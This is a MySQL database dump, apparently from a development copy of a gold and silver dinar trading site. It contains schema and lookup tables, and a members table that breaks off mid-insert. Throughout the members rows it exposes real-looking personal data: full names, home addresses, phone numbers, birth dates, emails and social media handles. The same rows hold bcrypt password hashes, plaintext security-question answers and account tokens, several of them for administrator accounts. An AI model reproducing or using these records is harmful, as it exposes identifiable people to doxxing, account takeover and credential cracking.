CREATE TABLE IF NOT EXISTS `item_courier` (
  `ic_id` int(11) NOT NULL AUTO_INCREMENT,
  `ic_name` varchar(200) NOT NULL,
  PRIMARY KEY (`ic_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=10 ;

--
-- Dumping data for table `item_courier`
--

INSERT INTO `item_courier` (`ic_id`, `ic_name`) VALUES
(1, 'Others'),
(2, 'Locket'),
(3, 'Earing'),
(4, 'Necklace'),
(5, 'Bar'),
(6, 'Ring'),
(7, 'Dinar'),
(8, 'Dirham'),
(9, 'Jewellery');

-- --------------------------------------------------------

--
-- Table structure for table `item_status_courier`
--

CREATE TABLE IF NOT EXISTS `item_status_courier` (
  `isc_id` int(11) NOT NULL AUTO_INCREMENT,
  `isc_name` varchar(200) NOT NULL,
  PRIMARY KEY (`isc_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `item_status_courier`
--

INSERT INTO `item_status_courier` (`isc_id`, `isc_name`) VALUES
(1, 'New'),
(2, 'Used'),
(3, 'Broken');

-- --------------------------------------------------------

--
-- Table structure for table `item_storage`
--

CREATE TABLE IF NOT EXISTS `item_storage` (
  `is_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) NOT NULL,
  `itct_id` int(11) DEFAULT '0',
  `ui_id` int(11) DEFAULT '0',
  `is_qty` varchar(200) DEFAULT '0',
  `is_status` int(11) DEFAULT '1',
  PRIMARY KEY (`is_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `item_storage_child`
--

CREATE TABLE IF NOT EXISTS `item_storage_child` (
  `isc_id` int(11) NOT NULL AUTO_INCREMENT,
  `is_id` int(11) NOT NULL,
  `isc_image` varchar(500) NOT NULL,
  `isc_datetime` datetime NOT NULL,
  `isc_price` varchar(200) NOT NULL DEFAULT '0',
  `isc_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`isc_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `item_type`
--

CREATE TABLE IF NOT EXISTS `item_type` (
  `it_id` int(11) NOT NULL AUTO_INCREMENT,
  `it_name` varchar(200) NOT NULL,
  `it_comm_rate_gram` varchar(200) NOT NULL DEFAULT '1.00',
  `it_comm_rate_money` varchar(200) NOT NULL DEFAULT '1.00',
  PRIMARY KEY (`it_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `item_type`
--

INSERT INTO `item_type` (`it_id`, `it_name`, `it_comm_rate_gram`, `it_comm_rate_money`) VALUES
(1, 'Gold', '1.00', '1.00'),
(2, 'Silver', '1.00', '0.50');

-- --------------------------------------------------------

--
-- Table structure for table `item_type_child`
--

CREATE TABLE IF NOT EXISTS `item_type_child` (
  `itc_id` int(11) NOT NULL AUTO_INCREMENT,
  `itc_name` varchar(200) NOT NULL,
  `itp_id` int(11) NOT NULL,
  PRIMARY KEY (`itc_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=9 ;

--
-- Dumping data for table `item_type_child`
--

INSERT INTO `item_type_child` (`itc_id`, `itc_name`, `itp_id`) VALUES
(1, 'Dinar', 1),
(2, 'Gold Jewellery', 2),
(3, 'Gold Bars', 1),
(4, 'Dirham', 7),
(5, 'Silver Jewellery', 7),
(6, 'Silver Bars', 7),
(7, 'Dinar', 3),
(8, 'Gold Bars', 3);

-- --------------------------------------------------------

--
-- Table structure for table `item_type_purity`
--

CREATE TABLE IF NOT EXISTS `item_type_purity` (
  `itp_id` int(11) NOT NULL AUTO_INCREMENT,
  `it_id` int(11) NOT NULL,
  `pu_id` int(11) NOT NULL,
  `itp_price` varchar(200) NOT NULL,
  `itp_rate` varchar(200) NOT NULL DEFAULT '1',
  PRIMARY KEY (`itp_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=8 ;

--
-- Dumping data for table `item_type_purity`
--

INSERT INTO `item_type_purity` (`itp_id`, `it_id`, `pu_id`, `itp_price`, `itp_rate`) VALUES
(1, 1, 1, '200.00', '1'),
(2, 1, 2, '126.75', '1'),
(3, 1, 3, '122.51', '1'),
(4, 1, 4, '116.75', '1'),
(5, 1, 5, '111.19', '1'),
(6, 1, 6, '100.70', '1'),
(7, 2, 1, '9.35', '1');

-- --------------------------------------------------------

--
-- Table structure for table `keep`
--

CREATE TABLE IF NOT EXISTS `keep` (
  `k_id` int(11) NOT NULL AUTO_INCREMENT,
  `k_startdate` datetime NOT NULL,
  `k_enddate` datetime NOT NULL,
  `sl_id` int(11) NOT NULL,
  `me_id` int(11) NOT NULL,
  `k_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`k_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `keep_child`
--

CREATE TABLE IF NOT EXISTS `keep_child` (
  `kc_id` int(11) NOT NULL AUTO_INCREMENT,
  `k_id` int(11) NOT NULL,
  `v_id` int(11) NOT NULL,
  `kc_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`kc_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `landing_page`
--

CREATE TABLE IF NOT EXISTS `landing_page` (
  `lan_id` int(11) NOT NULL AUTO_INCREMENT,
  `lan_image` varchar(2000) NOT NULL,
  `lan_title` varchar(100) NOT NULL,
  `lan_subtitle` varchar(2000) NOT NULL,
  `lan_status` int(11) NOT NULL,
  `lan_colour` varchar(11) NOT NULL,
  `lan_order` int(11) NOT NULL,
  PRIMARY KEY (`lan_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=7 ;

--
-- Dumping data for table `landing_page`
--

INSERT INTO `landing_page` (`lan_id`, `lan_image`, `lan_title`, `lan_subtitle`, `lan_status`, `lan_colour`, `lan_order`) VALUES
(2, '0f9b1-maulidulrasul.jpg', 'Maulid Nabi MUHAMMAD', ' Sallallahu Alayhi Wasallam (SAW) <BR> " His birth was a light in the dark, His preach was an oasis in the dessert, His sacrifice was a bright moon in the lightless night "', 2, '1', 2),
(3, 'a55db-maalhijrah.jpg', 'SALAM MAAL HIJRAH (1437H)', 'It''s not difficult to change, the difficulties come within us. <br/> Begin with a step. Be the change. Salam Maal Hijrah. ', 2, '2', 3),
(4, 'ee8e3-makkah.jpg', 'EID ADHA MUBARAK', 'May the devine blessings of Allah fill your home and heart with the spirit of joy and open up newer opportunities for success.', 2, '2', 4),
(5, 'e6a76-untitled-1.jpg', 'HAPPY UPCOMING EID MUBARAK', '', 2, '1', 2),
(6, 'c2570-rejab.jpg', 'Rajab is Allah''s month', 'Sha''aban my month & Ramadhan the month of my Ummah whosoever fasts a day in the month of Rajab will  be granted the great reward of Ridwan (an angle in heaven); the warth of Allah shall be distance and a door of the hell shall be closed. - Holy Prophet (saw)', 1, '1', 5);

-- --------------------------------------------------------

--
-- Table structure for table `liquid_item`
--

CREATE TABLE IF NOT EXISTS `liquid_item` (
  `li_id` int(11) NOT NULL AUTO_INCREMENT,
  `v_id` int(11) NOT NULL,
  `li_datetime` datetime NOT NULL,
  `sl_id` int(11) NOT NULL,
  `me_id` int(11) NOT NULL,
  `lis_id` int(11) NOT NULL,
  PRIMARY KEY (`li_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `liquid_item_status`
--

CREATE TABLE IF NOT EXISTS `liquid_item_status` (
  `lis_id` int(11) NOT NULL AUTO_INCREMENT,
  `lis_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`lis_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `liquid_item_status`
--

INSERT INTO `liquid_item_status` (`lis_id`, `lis_desc`) VALUES
(1, 'Pending'),
(2, 'Completed'),
(3, 'Reject');

-- --------------------------------------------------------

--
-- Table structure for table `members`
--

CREATE TABLE IF NOT EXISTS `members` (
  `me_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_image` varchar(200) DEFAULT 'default-img.jpg',
  `me_firstname` varchar(200) NOT NULL,
  `me_lastname` varchar(200) DEFAULT NULL,
  `me_username` varchar(200) NOT NULL,
  `me_password` varchar(200) NOT NULL,
  `me_question` varchar(500) DEFAULT NULL,
  `me_answer` varchar(500) DEFAULT NULL,
  `me_unique_link` varchar(200) NOT NULL,
  `me_address1` varchar(500) DEFAULT NULL,
  `me_city1` varchar(200) DEFAULT NULL,
  `me_state1` varchar(200) DEFAULT NULL,
  `me_postcode1` varchar(50) DEFAULT NULL,
  `me_country1` varchar(200) DEFAULT NULL,
  `me_address2` varchar(500) DEFAULT NULL,
  `me_city2` varchar(200) DEFAULT NULL,
  `me_state2` varchar(200) DEFAULT NULL,
  `me_postcode2` varchar(50) DEFAULT NULL,
  `me_country2` varchar(200) DEFAULT NULL,
  `me_government_issue_id` varchar(200) DEFAULT NULL,
  `me_driver_license` varchar(200) DEFAULT NULL,
  `me_phone_no` varchar(50) DEFAULT NULL,
  `me_birth_date` varchar(20) DEFAULT NULL,
  `me_description` varchar(500) DEFAULT NULL,
  `me_maiden_name` varchar(200) DEFAULT NULL,
  `me_nationality` varchar(200) DEFAULT NULL,
  `me_facebook` varchar(200) DEFAULT NULL,
  `me_twitter` varchar(200) DEFAULT NULL,
  `me_instagram` varchar(200) DEFAULT NULL,
  `me_googleplus` varchar(200) DEFAULT NULL,
  `me_whatsapp_no` varchar(200) DEFAULT NULL,
  `me_telegram` varchar(200) DEFAULT NULL,
  `me_wechat` varchar(200) DEFAULT NULL,
  `me_email` varchar(200) DEFAULT NULL,
  `me_register_date` datetime NOT NULL,
  `me_account_type` int(11) NOT NULL,
  `me_activation_status` int(11) NOT NULL DEFAULT '1',
  `me_last_login` varchar(50) DEFAULT NULL,
  `me_magic_num` varchar(200) DEFAULT NULL,
  `ml_id` int(11) NOT NULL,
  `me_status` int(11) NOT NULL DEFAULT '1',
  `me_company` varchar(200) DEFAULT NULL,
  `me_reg_num` varchar(200) DEFAULT NULL,
  `me_company_doc1` varchar(200) DEFAULT NULL,
  `me_company_doc1_verify` int(11) NOT NULL DEFAULT '1',
  `me_company_doc2` varchar(200) DEFAULT NULL,
  `me_company_doc2_verify` int(11) NOT NULL DEFAULT '1',
  `me_type` varchar(200) NOT NULL DEFAULT 'NU',
  `sl_id` int(11) NOT NULL,
  `g_id` int(11) NOT NULL DEFAULT '0',
  `me_is_amil` varchar(200) NOT NULL DEFAULT 'no',
  PRIMARY KEY (`me_id`),
  UNIQUE KEY `me_username` (`me_username`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=56 ;

--
-- Dumping data for table `members`
--

INSERT INTO `members` (`me_id`, `me_image`, `me_firstname`, `me_lastname`, `me_username`, `me_password`, `me_question`, `me_answer`, `me_unique_link`, `me_address1`, `me_city1`, `me_state1`, `me_postcode1`, `me_country1`, `me_address2`, `me_city2`, `me_state2`, `me_postcode2`, `me_country2`, `me_government_issue_id`, `me_driver_license`, `me_phone_no`, `me_birth_date`, `me_description`, `me_maiden_name`, `me_nationality`, `me_facebook`, `me_twitter`, `me_instagram`, `me_googleplus`, `me_whatsapp_no`, `me_telegram`, `me_wechat`, `me_email`, `me_register_date`, `me_account_type`, `me_activation_status`, `me_last_login`, `me_magic_num`, `ml_id`, `me_status`, `me_company`, `me_reg_num`, `me_company_doc1`, `me_company_doc1_verify`, `me_company_doc2`, `me_company_doc2_verify`, `me_type`, `sl_id`, `g_id`, `me_is_amil`) VALUES
(1, '99271c3805aa830738485064b3707cc9.jpg', 'DP System HQ', 'Dinarpal', 'dphq', '$2a$08$R26OP4OtJ2PCewXZLW5ab.DpVPpHZwRtR.Fbfm4qKXTothzh7KkG6', 'What is my pet''s name?', 'comel', 'http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://local', 'J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.', 'AYER KEROH', 'MELAKA', '75450', 'MALAYSIA', '91, JALAN KERAI, SG. RETANG.', 'JERANTUT', 'PAHANG', '27000', 'MALAYSIA', 'MY001', 'B and D', '0199737579', '1989-10-31', '', 'Ntoh', 'Malaysia', 'https://www.facebook.com/kidzeclipes', 'https://twitter.com/kidzeclipes', 'https://www.instagram.com/umaq_89/', 'https://plus.google.com/u/0/110272712192644641706/posts', '0199737579', '019-9737579', '+6 019-973 7579', 'kidzeclipes@gmail.com', '2014-11-10 10:12:00', 2, 2, '2016-04-27T15:08:54+08:00', '0d4368f80cd1d149576c068211e89fbf', 3, 1, 'Tuffah Informatics', 'MA0182480-H', '8dbaa9d1e7f114245d186c546ab9a7d6.jpg', 1, '25e878659a4d2c4c9f76576fa1656530.jpg', 1, 'DP', 1, 1, 'yes'),
(2, '007670359b0f05b910f399488e2ffcea.jpg', 'asd', 'dsa', 'asd', '$2a$08$zRnQHtdGJnSdsPPqfGCXHef3VnVG06p.bQhM1vEs2b.Kcwz6aoF7K', 'Who am I?', 'Jack Sparrow', '7815696ecbf1c96e6894b779456d330e', '', '', '', '', '', '', '', '', '', '', NULL, NULL, '123', '1998-10-02', NULL, NULL, NULL, 'facebok asd', 'twitter saya', '', '', '', '', '', 'umar@tuffah.info', '2014-12-13 19:45:41', 1, 2, '2016-04-29T11:50:51+08:00', 'ec623adec13773d99685c93053d3228e', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 1, 'no'),
(3, '6d3ac-adeq-nur---ftmk!-20150212_151603.jpg', 'Nur Umira', 'Mustafa', 'nur', '$2a$08$R26OP4OtJ2PCewXZLW5ab.DpVPpHZwRtR.Fbfm4qKXTothzh7KkG6', 'What is my username?', 'nur', 'b55178b011bfb206965f2638d0f87047', 'J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.', 'AYER KEROH', 'MELAKA', '75450', 'MALAYSIA', '91, JALAN KERAI, SG. RETANG.', 'JERANTUT', 'PAHANG', '27000', 'MALAYSIA', NULL, NULL, '0136420142', '1993-05-18', NULL, NULL, NULL, 'https://www.facebook.com/nurumira', 'https://twitter.com/nurumira', 'http://instagram.com/nurumira', 'http://googleplus.com/nurumira', '0199737579', '-', '-', 'nurumira@gmail.com', '2015-04-27 03:12:49', 1, 2, '2016-04-29T22:58:32+08:00', '69c0e639c71a34bb6b710f043138f7f8', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 2, 'no'),
(4, 'default-img.jpg', 'pisang', 'admin', 'pisang', '$2a$08$pn2U5NZix1EOx/.IYmmaeOYnIdxL7faB39ElDFFulsyFVRuaoTm8q', 'What is my username?', 'a1', '8a8bb7cd343aa2ad99b7d762030857a2', NULL, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', '', '', NULL, NULL, NULL, 'pisang@dinarpal.com', '2014-12-28 07:27:16', 1, 2, '2015-02-11T23:32:46+08:00', '97669d6b22a790a5feb7f9c06f6e3d03', 1, 1, NULL, NULL, NULL, 1, NULL, 1, 'GA', 1, 0, 'no'),
(5, 'default-img.jpg', 'God Admin', 'bujang', 'godadmin', '$2a$08$60LE6Y86CP3V8y2filvJ7eB/0HqDk/gFNmjb4y0P.tXP83X/Y/3fy', 'What is my username?', 'b1', 'edbab45572c72a5d9440b40bcc0500c0', NULL, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', '', '', NULL, NULL, NULL, 'staff@dinarpal.com', '2014-12-28 07:28:05', 1, 2, '2016-04-29T18:21:13+08:00', '9512afcb3f0fde463ddf8e476a76be16', 2, 1, NULL, NULL, NULL, 1, NULL, 1, 'GA', 1, 0, 'yes'),
(6, '0', 'Umar Mukhtar', 'Hambaran', 'umaq', '$2a$08$inyWmlUEj34H2i0O3wpgnOTGfXYO/OfwidGSuOG3CKl80AT3LT/LO', 'What is my username?', 'umaq', 'f859ba0d46c0db4c1d51a83e87ce4d60', 'J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.', 'AYER KEROH', 'MELAKA', '75450', 'MALAYSIA', 'J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.', 'AYER KEROH', 'MELAKA', '75450', 'MALAYSIA', NULL, NULL, '0199737579', '1989-10-31', NULL, NULL, NULL, 'https://www.facebook.com/kidzeclipes', 'https://twitter.com/kidzeclipes', 'https://www.instagram.com/umaq_89/', '', '0199737579', '019-9737579', '+6 019-973 7579', 'umaqgeek@gmail.com', '2016-04-23 17:41:39', 1, 2, '2016-04-29T22:58:47+08:00', '1fa594584e0ad290e2563f1d519e3e21', 3, 1, '', '', '0', 1, '0', 1, 'NU', 0, 1, 'no'),
(7, 'default-img.jpg', 'arash', 'arash', 'arash', '$2a$08$kDybrdr5yu0UsAjlNpy13uadOdUuRXdpsPRhdm72EOq9fw0BnrEd6', 'What is my username?', 'arash', '81b9a3538d93a7623ad0e9bf1347d137', 'DinarPal Street', 'Ayer Keroh', 'Melaka', '75450', 'Malaysia', 'DinarPal Street', 'Ayer Keroh', 'Melaka', '75450', 'Malaysia', NULL, NULL, '60166707888', '1977-01-19', NULL, NULL, NULL, '', '', '', '', '', '', '', 'arash.private@live.com', '2016-04-23 17:41:44', 1, 2, '2016-04-29T19:32:39+08:00', '248dfd4fff3169f86edec2930684bfd4', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 1, 'no'),
(8, 'default-img.jpg', 'zakyrich7296', 'zakyrich7296', 'zakyrich7296', '$2a$08$J.C/HjvQJa7Y.qpWPCcgAOvIC7M/75Yy7Qva7kMl7Zb6car/wi0ya', 'What is my username?', 'zakyrich7296', 'ef19a099b6823a324131c05a3bafd92d', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'mohdz7296@yahoo.com', '2016-04-23 17:56:16', 1, 2, '2016-04-23T18:05:43+08:00', '3a171815700931cf729724c50ac4191a', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(9, 'default-img.jpg', 'ruxaini89@gmail.com', 'ruxaini89@gmail.com', 'ruxaini89@gmail.com', '$2a$08$VoSsC09WL5Np4awJRdEjWusYx9LECoxhLfhkGcGU4HSq8093pg0ua', 'What is my username?', 'ruxaini89@gmail.com', '57a476e2b37f20f08708e171d9d58d4c', '', '', '', '', '', '', '', '', '', '', NULL, NULL, '0135096088', '2016-03-29', NULL, NULL, NULL, '', '', '', '', '', '', '', 'ruxaini89@gmail.com', '2016-04-23 19:11:04', 1, 2, '2016-04-25T14:48:31+08:00', '57a476e2b37f20f08708e171d9d58d4c', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 1, 'no'),
(10, 'default-img.jpg', 'muhai', 'muhai', 'muhai', '$2a$08$IWimoWz73YOCDQQ6RXdGSep3.pmR6och.1qkRL8520YJlp.474WdK', 'What is my username?', 'muhai', '1f224e9700571b8b26f31dfb323f1b5f', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'muhai1991@gmail.com', '2016-04-23 19:16:31', 1, 2, '2016-04-23T19:24:12+08:00', '3e533ec1872fb3b11675b85505da24a8', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(11, 'default-img.jpg', 'affan nasir', 'affan nasir', 'affan nasir', '$2a$08$Lpxr8KKtXFc8LPo6kryToudMI1iAup0a3585PfdDzCuxqLhMcXE2y', 'What is my username?', 'affan nasir', 'da683f94ee3267a60f77e0a355cc0285', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'affan_nasir@ymail.com', '2016-04-23 20:34:09', 1, 1, NULL, 'b9e950403cce14cdea8fd04fb585c433', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(24, 'default-img.jpg', 'fadhlan97_president', 'fadhlan97_president', 'fadhlan97_president', '$2a$08$RzBzLfGXdBWR/fceOeZ6/eBy1H9/zw1M11J3s/pPdo6kGWNikx6u2', 'What is my username?', 'fadhlan97_president', '6015d944c8f9a1806b90b6d46af5ba12', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'fadhlanj24@gmail.com', '2016-04-23 22:15:35', 1, 2, '2016-04-23T22:16:37+08:00', '9b2e397ed5d134beea070156b0a21a9d', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(25, 'default-img.jpg', 'Azizi01', 'Azizi01', 'Azizi01', '$2a$08$OQ4GPp4zBKFBpvdBchdLK.760gGJuCKOMMpCvLUMfTPUjmhyQDwkC', 'What is my username?', 'Azizi01', 'e5f11d06fec451734cb5d7f2d0ee4cd4', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'mohdazizi@myself.com', '2016-04-23 22:15:39', 1, 2, '2016-04-23T22:18:06+08:00', '68c9090218c4b1336f6cfb4cc941918c', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(26, '84cc8071ffe9754d941efdd89ce6c467.png', 'Mohd Zulkefli', 'Hamdan', 'mzh', '$2a$08$XJGxkIp5C9u8i8Myb3sAMeK2G5hOJ0bZZU68UYvzjvH1ss5PWpYe.', 'What is my username?', 'mzh', 'eab54c7fb6a1daabe6b845752b0b5234', 'No 29, Jalan Jati 18', 'Batu Berendam', 'Melaka', '75350', 'Malaysia', 'No 29, Jalan Jati 18', 'Batu Berendam', 'Melaka', '75350', 'Malaysia', NULL, NULL, '0122228069', '1989-02-09', NULL, NULL, NULL, 'ijulkefli', 'ijulkefli', 'ijulkefli', 'ijulkefli', '0122228069', '0122228069', 'ijulkefli', 'ijul89@gmail.com', '2016-04-23 22:15:46', 1, 2, '2016-04-29T08:04:04+08:00', 'ba64d4c8f84e926af9e9955542eff18c', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 1, 'no'),
(27, 'default-img.jpg', 'Noor Jeehan', 'Adam', 'jeehan', '$2a$08$FmbeyGYrYgCTu9ouKa7Rm.mZ76VXUftgVSbZvkuEotXJ6jfMnrbhu', 'What is my username?', 'jeehan', 'd2863ac3a451b90639a40c0554b20b68', 'Lot 548, Bt 19, Jalan Chin Chin, Pekan Jasin', 'Jasin', 'Melaka', '77000', 'Malaysia', 'Lot 548, Bt 19, Jalan Chin Chin, Pekan Jasin', 'Jasin', 'Melaka', '77000', 'Malaysia', NULL, NULL, '0122243256', '', NULL, NULL, NULL, '', '', '', '', '', '', '', 'bngbaby@gmail.com', '2016-04-23 22:16:00', 1, 2, '2016-04-26T22:09:55+08:00', '626b9d471c3597d67e3e5c148d83cb0b', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 2, 'no'),
(28, 'default-img.jpg', 'Shrom', 'Shrom', 'Shrom', '$2a$08$fz9y1ifM4Dx8VZgyGWysp.JEt428OlLkHJibvKiVPk0vVZw9kSHWG', 'What is my username?', 'Shrom', '3145e569198a173e2df9aeb208e84997', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'shahsgn80@gmail.com', '2016-04-23 22:16:04', 1, 1, NULL, '89c578d6a5340217bf6d9a2eb240385c', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(29, 'default-img.jpg', 'Azemi279', 'Azemi279', 'Azemi279', '$2a$08$Nc39dBH.PyMDRtpm3GE9meHpX.ZJswrScN5JywIIPCu1JcEnIwCH2', 'What is my username?', 'Azemi279', 'c5fb7dd24e54bae19ddbe48217cf8ec5', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Md_azemifly@yahoo.com.my', '2016-04-23 22:17:52', 1, 1, NULL, '08e3d9dc069d90776b3544382cc97749', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(30, 'default-img.jpg', 'AzlindaSHAH', 'AzlindaSHAH', 'AzlindaSHAH', '$2a$08$qlCjO.RaKTNBcpHuNiiZiuy7kl2BJAFAPrtzv1A/OnxZWSwEh8NHe', 'What is my username?', 'AzlindaSHAH', '7fa5d122ef1b961c7ee98a0883d82105', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Shah_SGN80@yahoo.com', '2016-04-23 22:18:12', 1, 1, NULL, 'c40adcda23d8df482f069802d69af593', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(31, 'default-img.jpg', 'azren_78', 'azren_78', 'azren_78', '$2a$08$I0id63Hpcy0SYXVh5JvSRu1xWgmjbR/LpHez4h0kXNVQ67HmLO6aC', 'What is my username?', 'azren_78', 'c44be40623f0a8e5072a9528440d4e34', '', '', '', '', '', '', '', '', '', '', NULL, NULL, '', '', NULL, NULL, NULL, '', '', '', '', '', '', '', 'azren_78@yahoo.com', '2016-04-23 22:18:24', 1, 2, '2016-04-26T08:15:04+08:00', 'f2c9002da372411c462169206e2343c5', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 0, 'no'),
(32, 'default-img.jpg', 'Faiz8969', 'Faiz8969', 'Faiz8969', '$2a$08$XKvKVPGX0Ou7sbW7rVyJMecbj9gBERQCSsKN9eHM2FzfmmGTitRLG', 'What is my username?', 'Faiz8969', '289a710b44c5448da5b7f4c9b74d7dd7', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Refinity_alorgajah@yahoo.com', '2016-04-23 22:19:44', 1, 1, NULL, '64a87f85266bb43cb6f40e325212d572', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(33, '0', 'Yusnita549', 'Yusnita549', 'Yusnita549', '$2a$08$5Tvozt5nmqRHQTk98.h89Oq7tPsoGxE4XC3.9cD9OUJ6nV3BN0q/i', 'What is my username?', 'Yusnita549', '9b391385c69547ca973681f344193eb0', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'yusnita7303@gmail.com', '2016-04-23 22:39:20', 1, 1, NULL, '209fff7c6b21efd74ece6d4f625e8298', 3, 1, NULL, NULL, '0', 1, '0', 1, 'NU', 0, 0, 'no'),
(34, 'default-img.jpg', 'Baem84', 'Baem84', 'Baem84', '$2a$08$NiUb6TVNWtTFQVX3FuvKgOBx.2DFbUPoByGjerGGiQkoquVXSqMJO', 'What is my username?', 'Baem84', '2dec95aa1b89d819984d7961b8820c63', '', '', '', '', '', '', '', '', '', '', NULL, NULL, '0195030754', '1984-12-30', NULL, NULL, NULL, '', '', '', '', '', '', '', 'ibrahimabdhalim8@gmail.com', '2016-04-24 00:21:33', 1, 2, '2016-04-24T00:30:29+08:00', 'f74f305ff127ca02f92f2a1f62c2aeae', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 1, 'no'),
(35, 'default-img.jpg', 'nurazrreen', 'nurazrreen', 'nurazrreen', '$2a$08$83Fhcumx5QD/vm.zwZq1kua4wOs5HgPZS9MEN.TvkEImoDwZF.dvC', 'What is my username?', 'nurazrreen', '5afe6b6e249668f18abe527959bc69ea', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'nurazrreen@hotmail.com', '2016-04-24 10:08:07', 1, 2, '2016-04-24T10:12:04+08:00', '738d5e06b188a6e88d96f5a9f3108e0c', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
